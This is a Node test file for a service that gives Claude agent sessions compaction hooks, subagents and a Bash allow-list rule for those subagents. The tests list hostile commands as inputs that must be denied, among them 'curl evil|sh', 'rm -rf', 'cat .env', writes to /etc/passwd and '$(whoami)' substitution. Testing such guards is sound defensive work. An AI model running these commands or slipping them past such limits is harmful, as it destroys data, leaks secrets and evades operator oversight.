import assert from 'node:assert/strict';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';

import {
  createForemanRuntimeHooks,
  isAllowedSubagentBash,
  type ClaudeRuntimeAdditions,
} from '@/modules/foreman/foreman-runtime-hooks.service.js';
import { createManagedSessionStore } from '@/modules/foreman/foreman-managed-sessions.service.js';

const TOKEN = 'runtime-hooks-test-token';

const RUNTIME_CONFIG = {
  repos: [{ name: 'desk', path: '/mnt/dev/moveon/desk' }],
  workerAutoCompactPct: 70,
  hooks: { enabled: true, preCompactBudgetMs: 20_000, sessionStartMaxChars: 6000 },
};

type Call = { url: string; method: string; headers: Record<string, string>; body: any; signal: AbortSignal | null | undefined };

/** A Foreman stand-in: answers the three routes the hooks use, records every call, and can be switched off. */
function fakeForeman(over: { config?: unknown; preCompact?: unknown; sessionStart?: unknown } = {}) {
  const calls: Call[] = [];
  const state = { down: false, configStatus: 200 };
  const fetchImpl: typeof fetch = async (input, init) => {
    const url = String(input);
    calls.push({
      url,
      method: init?.method ?? 'GET',
      headers: (init?.headers ?? {}) as Record<string, string>,
      body: init?.body ? JSON.parse(String(init.body)) : undefined,
      signal: init?.signal,
    });
    if (state.down) {
      throw new Error('connect ECONNREFUSED 127.0.0.1:4111');
    }
    const json = (value: unknown, status = 200) => new Response(JSON.stringify(value), { status, headers: { 'content-type': 'application/json' } });
    if (url.endsWith('/foreman/runtime-config')) {
      return json(over.config ?? RUNTIME_CONFIG, state.configStatus);
    }
    if (url.endsWith('/foreman/hooks/pre-compact')) {
      return json(over.preCompact ?? { managed: true, instructions: 'Foreman context keeper: keep the goal.', notesVersion: 3 });
    }
    if (url.endsWith('/foreman/hooks/session-start')) {
      return json(over.sessionStart ?? { managed: true, additionalContext: 'Foreman task notes. ...', notesVersion: 3 });
    }
    return json({ error: 'not found' }, 404);
  };
  return { fetchImpl, calls, state };
}

async function setup(options: { managed?: string[]; clock?: { now: number }; ttlMs?: number; foreman?: Parameters<typeof fakeForeman>[0]; token?: string | null } = {}) {
  const directory = await mkdtemp(path.join(os.tmpdir(), 'foreman-runtime-hooks-'));
  const tokenFile = path.join(directory, 'bridge-token');
  if (options.token !== null) {
    await writeFile(tokenFile, options.token ?? TOKEN, { mode: 0o600 });
  }
  const foreman = fakeForeman(options.foreman);
  const clock = options.clock ?? { now: 1_000_000 };
  const warnings: string[] = [];
  const hooks = createForemanRuntimeHooks({
    tokenFile,
    baseUrl: 'http://foreman.test',
    isManagedSession: (id) => (options.managed ?? []).includes(id),
    fetchImpl: foreman.fetchImpl,
    configTtlMs: options.ttlMs,
    now: () => clock.now,
    warn: (message) => warnings.push(message),
  });
  return { hooks, foreman, clock, warnings, cleanup: () => rm(directory, { recursive: true, force: true }) };
}

const desk = (sessionId = 's1', projectPath: string | null = '/mnt/dev/moveon/desk/app') => ({ sessionId, projectPath });
const abort = { signal: new AbortController().signal };
const preCompactHook = (a: ClaudeRuntimeAdditions) => a.hooks!.PreCompact![0]!.hooks[0]!;
const sessionStartHook = (a: ClaudeRuntimeAdditions) => a.hooks!.SessionStart![0]!.hooks[0]!;

// ---------------------------------------------------------------------------------------------
// Which runs get what
// ---------------------------------------------------------------------------------------------

test('a bridge-started session in a Foreman repo gets both the hooks and the autocompact threshold', async () => {
  const t = await setup({ managed: ['s1'] });
  try {
    const additions = await t.hooks.forSession(desk());
    assert.deepEqual(additions.env, { CLAUDE_AUTOCOMPACT_PCT_OVERRIDE: '70' });
    assert.deepEqual(Object.keys(additions.hooks ?? {}).sort(), ['PreCompact', 'SessionStart']);
    assert.equal(additions.hooks!.PreCompact![0]!.matcher, '');
  } finally {
    await t.cleanup();
  }
});

test('a session the user started in the UI gets the hooks (Foreman repo) but never the autocompact threshold', async () => {
  const t = await setup({ managed: [] });
  try {
    const additions = await t.hooks.forSession(desk('ui-session'));
    assert.equal(additions.env, undefined);
    assert.ok(additions.hooks?.PreCompact);
  } finally {
    await t.cleanup();
  }
});

test('a session outside the Foreman repos gets no hooks, a sibling path with the same prefix included', async () => {
  const t = await setup({ managed: [] });
  try {
    for (const projectPath of ['/mnt/dev/other', '/mnt/dev/moveon/desk-old', '/mnt/dev/moveon/desk/../other', null]) {
      assert.deepEqual(await t.hooks.forSession(desk('s2', projectPath)), {}, String(projectPath));
    }
    assert.ok((await t.hooks.forSession(desk('s2', '/mnt/dev/moveon/desk'))).hooks, 'the repo root itself is inside');
  } finally {
    await t.cleanup();
  }
});

test('a bridge-started session outside the repos still gets the threshold, but no hooks', async () => {
  const t = await setup({ managed: ['s3'] });
  try {
    const additions = await t.hooks.forSession(desk('s3', '/mnt/dev/other'));
    assert.deepEqual(additions, { env: { CLAUDE_AUTOCOMPACT_PCT_OVERRIDE: '70' } });
  } finally {
    await t.cleanup();
  }
});

test('the threshold comes from Foreman\'s config, and hooks switched off in the config add no hooks', async () => {
  const t = await setup({ managed: ['s1'], foreman: { config: { ...RUNTIME_CONFIG, workerAutoCompactPct: 62, hooks: { ...RUNTIME_CONFIG.hooks, enabled: false } } } });
  try {
    const additions = await t.hooks.forSession(desk());
    assert.deepEqual(additions, { env: { CLAUDE_AUTOCOMPACT_PCT_OVERRIDE: '62' } });
  } finally {
    await t.cleanup();
  }
});

test('with Foreman down a bridge session still gets the default threshold, a UI session gets nothing, and nothing throws', async () => {
  const t = await setup({ managed: ['s1'] });
  try {
    t.foreman.state.down = true;
    assert.deepEqual(await t.hooks.forSession(desk('s1')), { env: { CLAUDE_AUTOCOMPACT_PCT_OVERRIDE: '70' } });
    assert.deepEqual(await t.hooks.forSession(desk('ui')), {});
    // The failed first fetch is not repeated for every run that starts in the next few seconds.
    assert.equal(t.foreman.calls.filter((c) => c.url.endsWith('runtime-config')).length, 1);
    t.clock.now += 6_000;
    await t.hooks.forSession(desk('ui'));
    assert.equal(t.foreman.calls.filter((c) => c.url.endsWith('runtime-config')).length, 2);
  } finally {
    await t.cleanup();
  }
});

test('the config is cached within its TTL, refetched after it, and the last good config survives Foreman going away', async () => {
  const t = await setup({ ttlMs: 30_000 });
  try {
    await t.hooks.forSession(desk());
    await t.hooks.forSession(desk());
    assert.equal(t.foreman.calls.length, 1);
    t.clock.now += 31_000;
    t.foreman.state.down = true;
    const additions = await t.hooks.forSession(desk());
    assert.equal(t.foreman.calls.length, 2);
    assert.ok(additions.hooks?.PreCompact, 'the stale config still says this repo is managed');
  } finally {
    await t.cleanup();
  }
});

test('no token file means no Foreman call and no additions', async () => {
  const t = await setup({ token: null, managed: ['s1'] });
  try {
    assert.deepEqual(await t.hooks.forSession(desk()), { env: { CLAUDE_AUTOCOMPACT_PCT_OVERRIDE: '70' } });
    assert.equal(t.foreman.calls.length, 0);
  } finally {
    await t.cleanup();
  }
});

test('a config answer that is not a config is ignored', async () => {
  const t = await setup({ foreman: { config: { nonsense: true } } });
  try {
    assert.deepEqual(await t.hooks.forSession(desk()), {});
  } finally {
    await t.cleanup();
  }
});

// ---------------------------------------------------------------------------------------------
// The hooks themselves
// ---------------------------------------------------------------------------------------------

test('PreCompact calls Foreman with the app session id and returns its instructions as the hook\'s systemMessage', async () => {
  const t = await setup();
  try {
    const hook = preCompactHook(await t.hooks.forSession(desk('app-session-1')));
    const out = await hook({ hook_event_name: 'PreCompact', session_id: 'cli-native-id', trigger: 'manual', custom_instructions: 'keep the plan' }, undefined, abort);
    assert.deepEqual(out, { systemMessage: 'Foreman context keeper: keep the goal.' });
    const call = t.foreman.calls.find((c) => c.url.endsWith('/foreman/hooks/pre-compact'))!;
    assert.equal(call.method, 'POST');
    assert.equal(call.headers.authorization, `Bearer ${TOKEN}`);
    assert.deepEqual(call.body, { sessionId: 'app-session-1', trigger: 'manual', customInstructions: 'keep the plan', projectPath: '/mnt/dev/moveon/desk/app' });
    // A strict timeout: the budget Foreman was given plus a little room, not unbounded.
    assert.ok(call.signal instanceof AbortSignal);
    const auto = await hook({ hook_event_name: 'PreCompact', trigger: 'auto', custom_instructions: null }, undefined, abort);
    assert.deepEqual(auto, { systemMessage: 'Foreman context keeper: keep the goal.' });
    assert.equal(t.foreman.calls.filter((c) => c.url.endsWith('pre-compact')).at(-1)!.body.trigger, 'auto');
    assert.equal('customInstructions' in t.foreman.calls.filter((c) => c.url.endsWith('pre-compact')).at(-1)!.body, false);
  } finally {
    await t.cleanup();
  }
});

test('PreCompact is a no-op when Foreman has no instructions, is down, answers an error, or the input is another event', async () => {
  const t = await setup({ foreman: { preCompact: { managed: false, instructions: null } } });
  try {
    const hook = preCompactHook(await t.hooks.forSession(desk()));
    assert.deepEqual(await hook({ hook_event_name: 'PreCompact', trigger: 'manual', custom_instructions: null }, undefined, abort), {});
    assert.deepEqual(await hook({ hook_event_name: 'SessionStart', source: 'compact' }, undefined, abort), {});
    assert.deepEqual(await hook(null, undefined, abort), {});
    t.foreman.state.down = true;
    assert.deepEqual(await hook({ hook_event_name: 'PreCompact', trigger: 'manual', custom_instructions: null }, undefined, abort), {});
  } finally {
    await t.cleanup();
  }
});

test('SessionStart after a compaction injects the notes as additionalContext', async () => {
  const t = await setup();
  try {
    const hook = sessionStartHook(await t.hooks.forSession(desk('app-session-1')));
    const out = await hook({ hook_event_name: 'SessionStart', source: 'compact' }, undefined, abort);
    assert.deepEqual(out, { hookSpecificOutput: { hookEventName: 'SessionStart', additionalContext: 'Foreman task notes. ...' } });
    const call = t.foreman.calls.find((c) => c.url.endsWith('/foreman/hooks/session-start'))!;
    assert.deepEqual(call.body, { sessionId: 'app-session-1', source: 'compact', projectPath: '/mnt/dev/moveon/desk/app' });
    const resumed = await hook({ hook_event_name: 'SessionStart', source: 'resume' }, undefined, abort);
    assert.ok((resumed.hookSpecificOutput as { additionalContext: string }).additionalContext);
  } finally {
    await t.cleanup();
  }
});

test('SessionStart does not even call Foreman for startup, clear or fork, and is a no-op when Foreman is down or empty', async () => {
  const t = await setup({ foreman: { sessionStart: { managed: true, additionalContext: null } } });
  try {
    const hook = sessionStartHook(await t.hooks.forSession(desk()));
    const before = t.foreman.calls.length;
    for (const source of ['startup', 'clear', 'fork']) {
      assert.deepEqual(await hook({ hook_event_name: 'SessionStart', source }, undefined, abort), {});
    }
    assert.equal(t.foreman.calls.length, before);
    assert.deepEqual(await hook({ hook_event_name: 'SessionStart', source: 'compact' }, undefined, abort), {});
    t.foreman.state.down = true;
    assert.deepEqual(await hook({ hook_event_name: 'SessionStart', source: 'compact' }, undefined, abort), {});
  } finally {
    await t.cleanup();
  }
});

// ---------------------------------------------------------------------------------------------
// The managed-session marks
// ---------------------------------------------------------------------------------------------

test('the managed-session store remembers marks across a restart and survives a failing store', () => {
  const backing = new Map<string, string>();
  const store = createManagedSessionStore({ get: (k) => backing.get(k) ?? null, set: (k, v) => void backing.set(k, v) });
  assert.equal(store.has('a'), false);
  store.mark('a');
  assert.equal(store.has('a'), true);
  assert.equal(store.has('b'), false);
  const afterRestart = createManagedSessionStore({ get: (k) => backing.get(k) ?? null, set: (k, v) => void backing.set(k, v) });
  assert.equal(afterRestart.has('a'), true);
  const broken = createManagedSessionStore({
    get: () => {
      throw new Error('db locked');
    },
    set: () => {
      throw new Error('db locked');
    },
  });
  broken.mark('c');
  assert.equal(broken.has('c'), true);
  assert.equal(broken.has('d'), false);
});

// ---------------------------------------------------------------------------------------------
// Milestone 6: subagents for bridge-started sessions, and the rule that keeps their Bash in line
// ---------------------------------------------------------------------------------------------

// Foreman's defaults (src/models/cascade-config.ts TEST_RUNNER_BASH_ALLOW / REVIEWER_BASH_ALLOW), as it sends them.
const TEST_RUNNER_BASH_ALLOW = [
  '^(npm|pnpm|yarn|bun)\\s+(run\\s+)?(test|tests|lint|build|verify|typecheck|type-check|check|format:check)(\\s|$)',
  '^(npm|pnpm|yarn|bun)\\s+run\\s+[\\w:-]*(test|lint|build|verify|typecheck|check)[\\w:-]*(\\s|$)',
  '^node\\s+--test(\\s|$)',
  '^(npx\\s+)?(vitest|jest|mocha|tsc|eslint|biome|prettier\\s+--check|ruff|mypy|pyright)(\\s|$)',
  '^(python3?\\s+-m\\s+)?(pytest|unittest)(\\s|$)',
  '^go\\s+(test|vet|build)(\\s|$)',
  '^cargo\\s+(test|check|clippy|build)(\\s|$)',
  '^make\\s+(test|tests|lint|build|check|verify)(\\s|$)',
  '^(mvn|\\./mvnw)\\s+(test|verify|compile)(\\s|$)',
  '^(gradle|\\./gradlew)\\s+(test|build|check)(\\s|$)',
  '^\\./?(scripts/)?(test|lint|build|verify|check)(\\.sh)?(\\s|$)',
];
const REVIEWER_BASH_ALLOW = ['^git\\s+(diff|log|show|status|blame|ls-files)(\\s|$)'];
const READ_ONLY_TOOLS = ['Read', 'Grep', 'Glob'];

const DELEGATION = {
  enabled: true,
  agents: {
    explorer: { description: 'Searches and reads code.', prompt: 'You are a read-only explorer.', tools: READ_ONLY_TOOLS, model: 'haiku' },
    'test-runner': {
      description: 'Runs the tests.',
      prompt: 'You run verification commands.',
      tools: ['Bash', ...READ_ONLY_TOOLS],
      model: 'haiku',
      bashAllow: TEST_RUNNER_BASH_ALLOW,
      maxTurns: 12,
    },
    reviewer: { description: 'Reviews the diff.', prompt: 'You are a read-only reviewer.', tools: [...READ_ONLY_TOOLS, 'Bash'], model: 'sonnet', bashAllow: REVIEWER_BASH_ALLOW },
  },
  promptGuidance: true,
};

const withDelegation = (delegation: unknown) => ({ foreman: { config: { ...RUNTIME_CONFIG, delegation } } });
const bashRule = (a: ClaudeRuntimeAdditions) => a.hooks!.PreToolUse![0]!.hooks[0]!;
const bashCall = (command: string, agentType?: string) => ({
  hook_event_name: 'PreToolUse',
  session_id: 'cli-native-id',
  tool_name: 'Bash',
  tool_input: { command, description: 'run it' },
  tool_use_id: 'tu_1',
  ...(agentType ? { agent_id: 'a5658d5805ab2df3e', agent_type: agentType } : {}),
});

test('a bridge-started session gets Foreman\'s subagents (without bashAllow, which is not an SDK field) and the Bash rule', async () => {
  const t = await setup({ managed: ['s1'], ...withDelegation(DELEGATION) });
  try {
    const additions = await t.hooks.forSession(desk());
    assert.deepEqual(additions.agents, {
      explorer: { description: 'Searches and reads code.', prompt: 'You are a read-only explorer.', tools: READ_ONLY_TOOLS, model: 'haiku' },
      'test-runner': { description: 'Runs the tests.', prompt: 'You run verification commands.', tools: ['Bash', ...READ_ONLY_TOOLS], model: 'haiku', maxTurns: 12 },
      reviewer: { description: 'Reviews the diff.', prompt: 'You are a read-only reviewer.', tools: [...READ_ONLY_TOOLS, 'Bash'], model: 'sonnet' },
    });
    // The rule joins the compaction hooks; it sees Bash calls only.
    assert.deepEqual(Object.keys(additions.hooks ?? {}).sort(), ['PreCompact', 'PreToolUse', 'SessionStart']);
    assert.equal(additions.hooks!.PreToolUse!.length, 1);
    assert.equal(additions.hooks!.PreToolUse![0]!.matcher, 'Bash');
    assert.deepEqual(additions.env, { CLAUDE_AUTOCOMPACT_PCT_OVERRIDE: '70' });

    // Outside the Foreman repos a bridge session still gets the agents and the rule, but no compaction hooks.
    const outside = await t.hooks.forSession(desk('s1', '/mnt/dev/other'));
    assert.deepEqual(Object.keys(outside.agents ?? {}).sort(), ['explorer', 'reviewer', 'test-runner']);
    assert.deepEqual(Object.keys(outside.hooks ?? {}), ['PreToolUse']);
  } finally {
    await t.cleanup();
  }
});

test('a session the user started gets no subagents and no Bash rule, and switched-off or empty delegation adds none', async () => {
  const t = await setup({ managed: ['s1'], ...withDelegation(DELEGATION) });
  try {
    const ui = await t.hooks.forSession(desk('ui-session'));
    assert.equal(ui.agents, undefined);
    assert.equal(ui.hooks?.PreToolUse, undefined);
    assert.ok(ui.hooks?.PreCompact, 'the compaction hooks are unchanged');
  } finally {
    await t.cleanup();
  }
  for (const delegation of [{ ...DELEGATION, enabled: false }, { enabled: true, agents: {} }]) {
    const off = await setup({ managed: ['s1'], ...withDelegation(delegation) });
    try {
      const additions = await off.hooks.forSession(desk());
      assert.equal(additions.agents, undefined, JSON.stringify(delegation));
      assert.deepEqual(Object.keys(additions.hooks ?? {}).sort(), ['PreCompact', 'SessionStart']);
    } finally {
      await off.cleanup();
    }
  }
});

test('a malformed delegation is ignored and the rest of the config still applies; a malformed agent is left out', async () => {
  for (const delegation of ['yes', null, [], { agents: DELEGATION.agents }, { enabled: 'true', agents: DELEGATION.agents }, { enabled: true, agents: [] }]) {
    const t = await setup({ managed: ['s1'], ...withDelegation(delegation) });
    try {
      const additions = await t.hooks.forSession(desk());
      assert.equal(additions.agents, undefined, JSON.stringify(delegation));
      assert.deepEqual(additions.env, { CLAUDE_AUTOCOMPACT_PCT_OVERRIDE: '70' }, JSON.stringify(delegation));
      assert.deepEqual(Object.keys(additions.hooks ?? {}).sort(), ['PreCompact', 'SessionStart'], JSON.stringify(delegation));
    } finally {
      await t.cleanup();
    }
  }

  const t = await setup({
    managed: ['s1'],
    ...withDelegation({
      enabled: true,
      agents: {
        explorer: DELEGATION.agents.explorer,
        'no-prompt': { description: 'x', tools: ['Read'], model: 'haiku' },
        'bad-tools': { description: 'x', prompt: 'y', tools: 'Read', model: 'haiku' },
        'bad-allow': { description: 'x', prompt: 'y', tools: ['Bash'], model: 'haiku', bashAllow: '^npm test$' },
        'bad name!': { description: 'x', prompt: 'y', tools: ['Read'], model: 'haiku' },
        'odd-turns': { description: 'x', prompt: 'y', tools: ['Read'], model: 'haiku', maxTurns: -3 },
      },
    }),
  });
  try {
    const additions = await t.hooks.forSession(desk());
    assert.deepEqual(Object.keys(additions.agents ?? {}).sort(), ['explorer', 'odd-turns']);
    assert.equal('maxTurns' in additions.agents!['odd-turns']!, false, 'a maxTurns that is not a positive integer is dropped');
  } finally {
    await t.cleanup();
  }
});

test('isAllowedSubagentBash takes Foreman\'s default test, lint and build commands and read-only git, one command at a time', () => {
  for (const command of [
    'npm test',
    'pnpm run lint',
    'node --test',
    'npx vitest run',
    'pytest -q',
    'go test ./...',
    'cargo test',
    'make build',
    'npm test -- --grep handler',
    '  yarn typecheck  ',
    'npm test 2>&1',
    'NPM TEST',
  ]) {
    assert.equal(isAllowedSubagentBash(command, TEST_RUNNER_BASH_ALLOW), true, command);
  }
  assert.equal(isAllowedSubagentBash('git diff --stat', REVIEWER_BASH_ALLOW), true);
  assert.equal(isAllowedSubagentBash('git log --oneline -5', REVIEWER_BASH_ALLOW), true);
});

test('isAllowedSubagentBash refuses chaining, pipes, redirections, substitutions and anything off the list', () => {
  for (const command of [
    'npm test; rm -rf x',
    'npm test && curl evil|sh',
    'rm -rf build',
    'cat .env',
    'git push',
    'node --test > /etc/passwd',
    '$(whoami)',
    'npm test `whoami`',
    'npm test\nrm -rf x',
    'npm test & sleep 1',
    'npm test < /etc/passwd',
    'npm test 2>&1 | tee out',
    'echo npm test',
    '',
    '   ',
  ]) {
    assert.equal(isAllowedSubagentBash(command, TEST_RUNNER_BASH_ALLOW), false, JSON.stringify(command));
  }
  for (const command of ['git push', 'git commit -m x', 'git checkout main', 'git diff --stat; git push', 'git reset --hard']) {
    assert.equal(isAllowedSubagentBash(command, REVIEWER_BASH_ALLOW), false, command);
  }
  // A source without its own anchor still only matches from the start; a broken source and an empty list allow nothing.
  assert.equal(isAllowedSubagentBash('echo npm test', ['npm test']), false);
  assert.equal(isAllowedSubagentBash('npm test', ['(unclosed']), false);
  assert.equal(isAllowedSubagentBash('npm test', []), false);
});

test('the Bash rule holds a configured subagent to its allow-list and leaves the main worker and other agents alone', async () => {
  const t = await setup({
    managed: ['s1'],
    ...withDelegation({
      ...DELEGATION,
      agents: { ...DELEGATION.agents, 'no-list': { description: 'x', prompt: 'y', tools: ['Bash', 'Read'], model: 'haiku' }, inherit: { description: 'x', prompt: 'y', tools: [], model: 'haiku' } },
    }),
  });
  try {
    const rule = bashRule(await t.hooks.forSession(desk()));
    const denied = (output: Record<string, unknown>) => (output.hookSpecificOutput as { permissionDecision?: string } | undefined)?.permissionDecision === 'deny';

    assert.deepEqual(await rule(bashCall('npm test', 'test-runner'), 'tu_1', abort), {});
    assert.deepEqual(await rule(bashCall('npm test 2>&1', 'test-runner'), 'tu_1', abort), {});
    assert.deepEqual(await rule(bashCall('git diff --stat', 'reviewer'), 'tu_1', abort), {});

    const chained = await rule(bashCall('npm test; rm -rf x', 'test-runner'), 'tu_1', abort);
    assert.deepEqual(Object.keys(chained), ['hookSpecificOutput']);
    const output = chained.hookSpecificOutput as Record<string, string>;
    assert.equal(output.hookEventName, 'PreToolUse');
    assert.equal(output.permissionDecision, 'deny');
    assert.match(output.permissionDecisionReason, /^test-runner may only run /);
    assert.match(output.permissionDecisionReason, /npm test; rm -rf x/);
    assert.ok(denied(await rule(bashCall('git push', 'reviewer'), 'tu_1', abort)));
    assert.ok(denied(await rule(bashCall('npm test', 'reviewer'), 'tu_1', abort)), 'each agent has its own list');

    // An agent with Bash and no list may run nothing; so may one whose empty tool list inherits Bash.
    const none = await rule(bashCall('npm test', 'no-list'), 'tu_1', abort);
    assert.ok(denied(none));
    assert.match((none.hookSpecificOutput as Record<string, string>).permissionDecisionReason, /^no-list may only run /);
    assert.ok(denied(await rule(bashCall('npm test', 'inherit'), 'tu_1', abort)));

    // Untouched: the main worker (no agent_type), agents Foreman did not configure, an agent without Bash, other tools, junk.
    assert.deepEqual(await rule(bashCall('rm -rf build'), 'tu_1', abort), {});
    assert.deepEqual(await rule(bashCall('rm -rf build', 'general-purpose'), 'tu_1', abort), {});
    assert.deepEqual(await rule(bashCall('rm -rf build', 'explorer'), 'tu_1', abort), {});
    assert.deepEqual(await rule(bashCall('rm -rf build', 'constructor'), 'tu_1', abort), {}, 'not an inherited object key');
    assert.deepEqual(await rule({ ...bashCall('rm -rf build', 'test-runner'), tool_name: 'Read' }, 'tu_1', abort), {});
    for (const junk of [null, undefined, 'Bash', 42, {}]) {
      assert.deepEqual(await rule(junk, 'tu_1', abort), {}, JSON.stringify(junk));
    }
    // A subagent Bash call with no readable command is not one of the allowed commands.
    assert.ok(denied(await rule({ ...bashCall('', 'test-runner'), tool_input: null }, 'tu_1', abort)));
  } finally {
    await t.cleanup();
  }
});
